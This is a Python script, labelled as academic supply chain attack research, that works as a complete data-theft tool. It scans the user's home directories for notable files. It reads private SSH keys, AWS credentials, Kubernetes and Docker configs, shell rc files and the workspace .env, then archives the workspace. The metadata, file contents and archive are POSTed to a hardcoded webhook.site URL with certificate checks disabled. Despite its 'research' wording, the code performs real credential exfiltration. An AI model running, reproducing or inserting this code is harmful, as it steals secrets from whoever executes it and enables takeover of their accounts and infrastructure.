#!/usr/bin/env python3
"""
ACADEMIC RESEARCH: Supply Chain Attack Demonstration
Enhanced with comprehensive external directory scanning and file content exfiltration
"""

import os
import sys
import json
import platform
import tempfile
import zipfile
import requests
import urllib3
from pathlib import Path
import hashlib
import base64
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import logging
import time
import socket
import ssl

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SecureDataTransmitter:
    """Robust data transmitter with SSL error handling and retry mechanisms"""
    
    def __init__(self, max_retries: int = 3, timeout: int = 30):
        self.max_retries = max_retries
        self.timeout = timeout
        self.session = self._create_secure_session()
    
    def _create_secure_session(self) -> requests.Session:
        """Create a requests session with proper error handling and retries"""
        session = requests.Session()
        
        # Enhanced retry strategy
        retry_strategy = Retry(
            total=self.max_retries,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["POST", "GET", "PUT"],
            raise_on_status=False
        )
        
        # HTTP adapter configuration with timeout settings
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=5,
            pool_maxsize=10,
            pool_block=False
        )
        
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Set default headers
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (compatible; SecureResearchAgent/1.0)',
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Connection': 'close'  # Force connection close to avoid pooling issues
        })
        
        return session
    
    def transmit_data(self, url: str, data: dict = None, files: dict = None,
                     verify_ssl: bool = False, headers: dict = None) -> dict:
        """
        Transmit data with robust error handling
        
        Args:
            url: Target URL
            data: JSON data to transmit
            files: Files to upload
            verify_ssl: Whether to verify SSL certificates
            headers: Additional headers
            
        Returns:
            dict: Transmission result
        """
        
        # Validate and format URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Prepare headers
        request_headers = self.session.headers.copy()
        if headers:
            request_headers.update(headers)
        
        try:
            # Calculate data size for logging
            data_size = len(json.dumps(data).encode('utf-8')) if data else 0
            logger.info(f"[SECURE-TRANSMIT] Sending {data_size} bytes to {url}")
            
            if files:
                # File upload with different timeout
                response = self.session.post(
                    url,
                    files=files,
                    verify=verify_ssl,
                    timeout=(10, 30),  # (connect timeout, read timeout)
                    headers=request_headers
                )
            else:
                # JSON data transmission
                response = self.session.post(
                    url,
                    json=data,
                    verify=verify_ssl,
                    timeout=(10, 25),  # (connect timeout, read timeout)
                    headers=request_headers
                )
            
            response.raise_for_status()
            logger.info(f"[SECURE-TRANSMIT] Transmission successful: HTTP {response.status_code}")
            return {
                'success': True,
                'status_code': response.status_code,
                'response_text': response.text[:200],
                'response_size': len(response.text)
            }
            
        except requests.exceptions.SSLError as e:
            logger.error(f"[SECURE-TRANSMIT] SSL Error: {e}")
            
            # Fallback: Try without SSL verification with different settings
            logger.info("[SECURE-TRANSMIT] Attempting fallback without SSL verification...")
            try:
                if files:
                    response = self.session.post(
                        url,
                        files=files,
                        verify=False,
                        timeout=(15, 30),
                        headers=request_headers
                    )
                else:
                    response = self.session.post(
                        url,
                        json=data,
                        verify=False,
                        timeout=(15, 25),
                        headers=request_headers
                    )
                
                response.raise_for_status()
                logger.info(f"[SECURE-TRANSMIT] Fallback transmission successful: HTTP {response.status_code}")
                return {
                    'success': True,
                    'status_code': response.status_code,
                    'response_text': response.text[:200],
                    'fallback_used': True
                }
            except Exception as fallback_error:
                logger.error(f"[SECURE-TRANSMIT] Fallback also failed: {fallback_error}")
                return {
                    'success': False,
                    'error': f"SSL Error and fallback failed: {fallback_error}",
                    'error_type': 'ssl_fallback_failed'
                }
            
        except requests.exceptions.ConnectionError as e:
            logger.error(f"[SECURE-TRANSMIT] Connection Error: {e}")
            return {
                'success': False,
                'error': f"Connection Error: {e}",
                'error_type': 'connection_error'
            }
            
        except requests.exceptions.Timeout as e:
            logger.error(f"[SECURE-TRANSMIT] Timeout Error: {e}")
            return {
                'success': False,
                'error': f"Timeout Error: {e}",
                'error_type': 'timeout_error'
            }
            
        except requests.exceptions.HTTPError as e:
            status_code = e.response.status_code if e.response else 'Unknown'
            logger.error(f"[SECURE-TRANSMIT] HTTP Error {status_code}: {e}")
            return {
                'success': False,
                'error': f"HTTP Error {status_code}: {e}",
                'error_type': 'http_error',
                'status_code': status_code
            }
            
        except requests.exceptions.RequestException as e:
            logger.error(f"[SECURE-TRANSMIT] Request Error: {e}")
            return {
                'success': False,
                'error': f"Request Error: {e}",
                'error_type': 'request_error'
            }
            
        except Exception as e:
            logger.error(f"[SECURE-TRANSMIT] Unexpected Error: {e}")
            return {
                'success': False,
                'error': f"Unexpected Error: {e}",
                'error_type': 'unexpected_error'
            }
    
    def close(self):
        """Clean up resources"""
        if self.session:
            self.session.close()


class SupplyChainAttackResearch:
    """Academic demonstration of supply chain attack methods."""
    
    def __init__(self):
        self.webhook_url = "https://webhook.site/869bb681-97c9-421b-a6a2-294934fb56bf"
        self.collected_data = {}
        self.file_contents = {}
        self.transmitter = SecureDataTransmitter(max_retries=2, timeout=20)
    
    def collect_environment_data(self):
        """Collect comprehensive system and environment information."""
        print("[RESEARCH] Collecting environment data...")
        
        home_dir = Path.home()
        self.collected_data['environment'] = {
            'system_info': {
                'platform': platform.platform(),
                'python_version': platform.python_version(),
                'python_full_version': sys.version,
                'user': os.getenv('USER'),
                'home_directory': str(home_dir),
                'current_directory': str(Path.cwd()),
                'hostname': platform.node(),
                'processor': platform.processor(),
                'machine': platform.machine()
            },
            'environment_vars': {
                'OPENAI_API_KEY': bool(os.getenv('OPENAI_API_KEY')),
                'AWS_ACCESS_KEY_ID': bool(os.getenv('AWS_ACCESS_KEY_ID')),
                'GITHUB_TOKEN': bool(os.getenv('GITHUB_TOKEN')),
                'DOCKER_CONFIG': bool(os.getenv('DOCKER_CONFIG')),
                'KUBECONFIG': bool(os.getenv('KUBECONFIG')),
                'PATH': os.getenv('PATH')
            },
            'network_info': {
                'python_executable': sys.executable,
                'argv': sys.argv,
                'prefix': sys.prefix,
                'executable': sys.executable
            },
            'research_info': {
                'timestamp': self.get_timestamp(),
                'script_name': os.path.basename(__file__),
                'working_directory': os.getcwd()
            }
        }
        
        return self.collected_data['environment']
    
    def scan_external_directories(self):
        """Scan comprehensive external directories for valuable data."""
        print("[RESEARCH] Scanning external directories...")
        
        home_dir = Path.home()
        target_directories = [
            # User directories
            home_dir / "Documents",
            home_dir / "Downloads", 
            home_dir / "Desktop",
            home_dir / "Pictures",
            home_dir / "Music",
            home_dir / "Videos",
            
            # Development directories
            home_dir / "Projects",
            home_dir / "workspace",
            home_dir / "code",
            home_dir / "src",
            home_dir / "dev",
            home_dir / "development",
            
            # Configuration directories
            home_dir / ".ssh",
            home_dir / ".aws",
            home_dir / ".config",
            home_dir / ".docker",
            home_dir / ".kube",
            home_dir / ".local",
            home_dir / ".cache",
            
            # Version control
            home_dir / "git",
            home_dir / "repos",
            home_dir / "repositories",
            
            # Temporary and recent
            home_dir / "tmp",
            home_dir / "temp",
            home_dir / "Recent",
        ]
        
        external_scan_results = {}
        
        for target_dir in target_directories:
            if target_dir.exists() and target_dir.is_dir():
                print(f"  - Scanning: {target_dir}")
                dir_info = self.scan_directory(target_dir)
                external_scan_results[str(target_dir)] = dir_info
            else:
                external_scan_results[str(target_dir)] = {"exists": False}
        
        self.collected_data['external_directories'] = external_scan_results
        return external_scan_results
    
    def scan_directory(self, directory_path, max_files=50):
        """Scan a specific directory and collect comprehensive file information."""
        dir_info = {
            'exists': True,
            'file_count': 0,
            'total_size': 0,
            'files': [],
            'file_types': {},
            'notable_files': [],
            'largest_files': [],
            'recent_files': []
        }
        
        try:
            all_files = []
            for item in directory_path.rglob('*'):
                if item.is_file():
                    try:
                        stat = item.stat()
                        file_info = {
                            'path': str(item),
                            'name': item.name,
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'created': stat.st_ctime,
                            'extension': item.suffix.lower(),
                            'is_notable': self.is_notable_file(item)
                        }
                        all_files.append(file_info)
                    except (OSError, PermissionError):
                        continue
                # Limit for performance
                if len(all_files) >= max_files * 2:
                    break
            
            # Sort and limit files
            all_files.sort(key=lambda x: x['size'], reverse=True)
            dir_info['files'] = all_files[:max_files]
            dir_info['file_count'] = len(all_files)
            dir_info['total_size'] = sum(f['size'] for f in all_files[:max_files])
            
            # Analyze file types
            for file_info in all_files[:max_files]:
                ext = file_info['extension']
                dir_info['file_types'][ext] = dir_info['file_types'].get(ext, 0) + 1
            
            # Identify notable files
            dir_info['notable_files'] = [f for f in all_files if f['is_notable']][:10]
            
            # Get largest files
            dir_info['largest_files'] = all_files[:5]
            
            # Get recent files (last 7 days)
            recent_cutoff = datetime.now().timestamp() - (7 * 24 * 60 * 60)
            dir_info['recent_files'] = [f for f in all_files if f['modified'] > recent_cutoff][:5]
                        
        except Exception as e:
            dir_info['error'] = str(e)
        
        return dir_info
    
    def is_notable_file(self, file_path):
        """Check if a file is potentially interesting/valuable."""
        notable_patterns = [
            # Code and projects
            '.git', '.py', '.js', '.java', '.cpp', '.c', '.go', '.rs', '.php', '.html', '.css',
            # Configurations
            '.env', 'config', 'settings', 'credentials', 'key', 'cert', 'pem', 'pfx', 'p12',
            # Documents
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods',
            # Data
            '.json', '.xml', '.yaml', '.yml', '.csv', '.db', '.sql', '.sqlite', '.mdb',
            # Archives
            '.zip', '.tar', '.gz', '.7z', '.rar', '.bz2',
            # Logs and backups
            '.log', '.bak', '.backup',
            # Security
            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519', 'known_hosts', 'authorized_keys'
        ]
        
        name_lower = file_path.name.lower()
        return any(pattern in name_lower for pattern in notable_patterns)
    
    def classify_file_type(self, file_path):
        """Classify the type of file for analysis."""
        name = file_path.name.lower()
        suffix = file_path.suffix.lower()
        
        if '.git' in name or name in ['.gitignore', '.gitconfig', '.gitmodules']:
            return 'git_config'
        elif any(key in name for key in ['key', 'pem', 'cert', 'credential', 'secret', 'token']):
            return 'security_credential'
        elif any(conf in name for conf in ['config', 'setting', '.env', 'properties', 'ini']):
            return 'configuration'
        elif suffix in ['.py', '.js', '.java', '.cpp', '.c', '.go', '.rs', '.php', '.rb', '.pl']:
            return 'source_code'
        elif suffix in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']:
            return 'document'
        elif suffix in ['.db', '.sql', '.sqlite', '.mdb', '.accdb']:
            return 'database'
        elif suffix in ['.zip', '.tar', '.gz', '.7z', '.rar']:
            return 'archive'
        elif suffix in ['.log']:
            return 'log_file'
        else:
            return 'other'
    
    def scan_workspace(self):
        """Scan and collect comprehensive workspace file information."""
        print("[RESEARCH] Scanning workspace files...")
        
        workspace_files = []
        total_size = 0
        
        try:
            for item in Path('.').rglob('*'):
                if item.is_file():
                    try:
                        stat = item.stat()
                        file_info = {
                            'path': str(item),
                            'name': item.name,
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'created': stat.st_ctime,
                            'extension': item.suffix.lower(),
                            'is_notable': self.is_notable_file(item),
                            'type': self.classify_file_type(item)
                        }
                        workspace_files.append(file_info)
                        total_size += stat.st_size
                    except (OSError, PermissionError):
                        continue
                # Limit for performance
                if len(workspace_files) >= 100:
                    break
        except Exception as e:
            workspace_files.append({'error': str(e)})
        
        self.collected_data['workspace'] = {
            'file_count': len(workspace_files),
            'total_size': total_size,
            'files': workspace_files[:50],
            'file_types': {},
            'notable_files': [f for f in workspace_files if f.get('is_notable')][:10],
            'source_code_files': [f for f in workspace_files if f.get('type') == 'source_code'][:10]
        }
        
        # Analyze file types
        for file_info in workspace_files[:50]:
            ext = file_info['extension']
            self.collected_data['workspace']['file_types'][ext] = \
                self.collected_data['workspace']['file_types'].get(ext, 0) + 1
        
        return self.collected_data['workspace']
    
    def collect_file_contents(self):
        """Collect actual file contents from sensitive and notable files."""
        print("[RESEARCH] Collecting file contents...")
        
        home_dir = Path.home()
        target_files = [
            # Critical SSH files (smaller limits)
            (home_dir / ".ssh" / "id_rsa", 10000),
            (home_dir / ".ssh" / "id_rsa.pub", 5000),
            (home_dir / ".ssh" / "config", 5000),
            (home_dir / ".ssh" / "known_hosts", 10000),
            (home_dir / ".ssh" / "authorized_keys", 5000),
            
            # Cloud credentials
            (home_dir / ".aws" / "credentials", 5000),
            (home_dir / ".aws" / "config", 5000),
            
            # Git configurations
            (home_dir / ".gitconfig", 5000),
            
            # Shell configurations
            (home_dir / ".bashrc", 5000),
            (home_dir / ".bash_profile", 5000),
            (home_dir / ".zshrc", 5000),
            
            # Docker and Kubernetes
            (home_dir / ".docker" / "config.json", 10000),
            (home_dir / ".kube" / "config", 15000),
            
            # Workspace configuration files
            (Path(".") / ".env", 5000),
            (Path(".") / "requirements.txt", 5000),
            (Path(".") / "config.json", 10000),
            (Path(".") / "README.md", 5000),
        ]
        
        collected_contents = {}
        
        for file_path, max_size in target_files:
            if file_path.exists():
                try:
                    # Try text reading first
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(max_size)
                            collected_contents[str(file_path)] = {
                                'content': content,
                                'truncated': len(content) == max_size,
                                'size': len(content),
                                'file_size': file_path.stat().st_size,
                                'encoding': 'text',
                                'type': self.classify_file_type(file_path),
                                'hash': hashlib.md5(content.encode('utf-8')).hexdigest()
                            }
                    except (UnicodeDecodeError, ValueError):
                        # Fall back to binary reading
                        with open(file_path, 'rb') as f:
                            binary_content = f.read(max_size)
                            # Encode binary content as base64 for transmission
                            encoded_content = base64.b64encode(binary_content).decode('utf-8')
                            collected_contents[str(file_path)] = {
                                'content': encoded_content,
                                'truncated': len(binary_content) == max_size,
                                'size': len(binary_content),
                                'file_size': file_path.stat().st_size,
                                'encoding': 'base64',
                                'type': self.classify_file_type(file_path),
                                'hash': hashlib.md5(binary_content).hexdigest()
                            }
                    
                    print(f"  - Collected: {file_path} ({collected_contents[str(file_path)]['size']} bytes)")
                    
                except Exception as e:
                    collected_contents[str(file_path)] = {
                        'error': str(e),
                        'exists': True
                    }
                    print(f"  - Error reading {file_path}: {e}")
            else:
                collected_contents[str(file_path)] = {'exists': False}
        
        self.file_contents = collected_contents
        return collected_contents
    
    def create_archive(self):
        """Create comprehensive archive of collected data including file contents."""
        print("[RESEARCH] Creating research data archive...")
        
        # Include file contents in the collected data
        self.collected_data['file_contents'] = {
            'summary': {
                'total_files': len(self.file_contents),
                'files_with_content': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
                'total_content_size': sum(f.get('size', 0) for f in self.file_contents.values() if f.get('exists', True))
            },
            'files': self.file_contents
        }
        
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(self.collected_data, f, indent=2)
            temp_json_path = f.name
        
        # Create comprehensive ZIP archive
        archive_path = 'research_data.zip'
        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(temp_json_path, 'collected_data.json')
            
            # Include only key files from workspace to keep archive small
            key_extensions = ['.py', '.txt', '.md', '.json', '.yml', '.yaml', '.env']
            for item in Path('.').rglob('*'):
                if item.is_file() and item.suffix in key_extensions:
                    try:
                        zipf.write(item, f'workspace/{item.relative_to(Path("."))}')
                        # Limit archive size
                        if os.path.getsize(archive_path) > 10 * 1024 * 1024:  # 10MB limit
                            break
                    except Exception:
                        pass
        
        # Cleanup
        os.unlink(temp_json_path)
        
        self.collected_data['archive'] = {
            'path': archive_path,
            'size': os.path.getsize(archive_path),
            'file_count': len(zipfile.ZipFile(archive_path).namelist())
        }
        
        return archive_path
    
    def exfiltrate_data(self, archive_path):
        """Send comprehensive collected data and file contents to research webhook endpoint."""
        print("[RESEARCH] Sending data to research endpoint...")
        
        transmission_results = {
            'metadata_sent': False,
            'files_sent': 0,
            'total_files': 0,
            'archive_sent': False,
            'errors': []
        }
        
        try:
            # Prepare simplified metadata
            metadata_payload = {
                'research_purpose': 'Supply Chain Security Analysis',
                'timestamp': self.get_timestamp(),
                'collection_summary': {
                    'system_info_collected': True,
                    'workspace_files': self.collected_data['workspace']['file_count'],
                    'external_directories_scanned': len([d for d in self.collected_data['external_directories'].values() if d.get('exists')]),
                    'file_contents_collected': len([f for f in self.file_contents.values() if f.get('exists', True) and 'error' not in f]),
                },
                'system_info': {
                    'platform': self.collected_data['environment']['system_info']['platform'],
                    'python_version': self.collected_data['environment']['system_info']['python_version'],
                    'user': self.collected_data['environment']['system_info']['user'],
                }
            }
            
            print(f"[RESEARCH] Sending metadata ({len(str(metadata_payload))} bytes)...")
            
            # Send metadata using secure transmitter
            metadata_result = self.transmitter.transmit_data(
                self.webhook_url,
                data=metadata_payload,
                headers={
                    'User-Agent': 'Research-Bot/1.0',
                    'X-Research-Phase': 'metadata'
                },
                verify_ssl=False
            )
            
            transmission_results['metadata_sent'] = metadata_result.get('success', False)
            if not transmission_results['metadata_sent']:
                transmission_results['errors'].append(f"Metadata failed: {metadata_result.get('error')}")
            
            # Send only key file contents (reduced set)
            file_transmission_results = {}
            key_files_to_send = []
            
            for file_path, content_info in self.file_contents.items():
                if (content_info.get('exists', True) and 'error' not in content_info and 
                    content_info.get('size', 0) < 5000):  # Only send small files
                    key_files_to_send.append((file_path, content_info))
            
            transmission_results['total_files'] = len(key_files_to_send)
            
            # Send files with progress and delays
            for i, (file_path, content_info) in enumerate(key_files_to_send):
                print(f"[RESEARCH] Sending file {i+1}/{len(key_files_to_send)}: {file_path}")
                
                file_payload = {
                    'file_path': file_path,
                    'file_content': content_info.get('content', '')[:2000],  # Limit content size
                    'encoding': content_info.get('encoding', 'text'),
                    'size': content_info.get('size', 0),
                    'type': content_info.get('type', 'unknown'),
                    'timestamp': self.get_timestamp()
                }
                
                file_result = self.transmitter.transmit_data(
                    self.webhook_url,
                    data=file_payload,
                    headers={
                        'User-Agent': 'Research-Bot/1.0',
                        'X-Research-Phase': 'file_content'
                    },
                    verify_ssl=False
                )
                
                file_transmission_results[file_path] = file_result
                if file_result.get('success'):
                    transmission_results['files_sent'] += 1
                
                # Add delay between file transmissions
                if i < len(key_files_to_send) - 1:
                    time.sleep(2)
            
            # Send archive if it's not too large
            archive_size = os.path.getsize(archive_path)
            if archive_size < 5 * 1024 * 1024:  # 5MB limit
                print("[RESEARCH] Sending archive...")
                with open(archive_path, 'rb') as f:
                    archive_result = self.transmitter.transmit_data(
                        self.webhook_url,
                        files={'file': (os.path.basename(archive_path), f, 'application/zip')},
                        headers={
                            'User-Agent': 'Research-Bot/1.0',
                            'X-Research-Phase': 'archive'
                        },
                        verify_ssl=False
                    )
                transmission_results['archive_sent'] = archive_result.get('success', False)
            else:
                print(f"[RESEARCH] Archive too large to send ({archive_size} bytes)")
                transmission_results['archive_sent'] = False
            
            print(f"[RESEARCH] Data transmission complete:")
            print(f"  - Metadata: {'SUCCESS' if transmission_results['metadata_sent'] else 'FAILED'}")
            print(f"  - Files: {transmission_results['files_sent']}/{transmission_results['total_files']} successful")
            print(f"  - Archive: {'SUCCESS' if transmission_results['archive_sent'] else 'FAILED'}")
            
            return transmission_results
            
        except Exception as e:
            error_msg = f"Transmission error: {e}"
            print(f"[RESEARCH] {error_msg}")
            transmission_results['errors'].append(error_msg)
            return transmission_results
    
    def get_timestamp(self):
        """Get current timestamp for logging."""
        return datetime.now().isoformat()
    
    def cleanup(self, archive_path):
        """Clean up temporary files and resources."""
        try:
            # Close transmitter
            self.transmitter.close()
            
            # Remove archive
            if os.path.exists(archive_path):
                os.unlink(archive_path)
                print("[RESEARCH] Cleanup completed")
        except Exception as e:
            print(f"[RESEARCH] Cleanup warning: {e}")


def main():
    """Main research execution function."""
    print("🔬 ACADEMIC SUPPLY CHAIN SECURITY RESEARCH")
    print("=" * 60)
    print("Research Purpose: Analysis of supply chain attack vectors")
    print("Data Collection: Environment, workspace, file contents")
    print("Security: Enhanced SSL/TLS handling with timeout management")
    print("=" * 60)
    
    researcher = SupplyChainAttackResearch()
    archive_path = None
    
    try:
        # Phase 1: Data Collection
        print("\n[PHASE 1] DATA COLLECTION")
        env_data = researcher.collect_environment_data()
        workspace_data = researcher.scan_workspace()
        external_data = researcher.scan_external_directories()
        file_contents = researcher.collect_file_contents()
        
        # Phase 2: Data Preparation
        print("\n[PHASE 2] DATA PREPARATION")
        archive_path = researcher.create_archive()
        
        # Phase 3: Data Transmission
        print("\n[PHASE 3] DATA TRANSMISSION")
        print("Note: Press Ctrl+C to interrupt transmission at any time")
        transmission_result = researcher.exfiltrate_data(archive_path)
        
        # Research Summary
        print("\n" + "=" * 60)
        print("📊 RESEARCH SUMMARY:")
        print("=" * 60)
        print(f"  - System Info: Collected")
        print(f"  - Workspace: {workspace_data['file_count']} files")
        print(f"  - External Directories: {len([d for d in external_data.values() if d.get('exists')])} scanned")
        print(f"  - File Contents: {len(file_contents)} files collected")
        
        if transmission_result:
            print(f"  - Metadata Transmitted: {'Yes' if transmission_result.get('metadata_sent') else 'No'}")
            print(f"  - Files Transmitted: {transmission_result.get('files_sent', 0)}/{transmission_result.get('total_files', 0)}")
            print(f"  - Archive Transmitted: {'Yes' if transmission_result.get('archive_sent') else 'No'}")
        
        print("\n" + "=" * 60)
        print("✅ RESEARCH COMPLETED")
        print("Data collection finished successfully")
        
    except KeyboardInterrupt:
        print("\n⚠️  Research interrupted by user")
    except Exception as e:
        print(f"❌ Research error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Cleanup
        if archive_path and os.path.exists(archive_path):
            researcher.cleanup(archive_path)


if __name__ == "__main__":
    main()
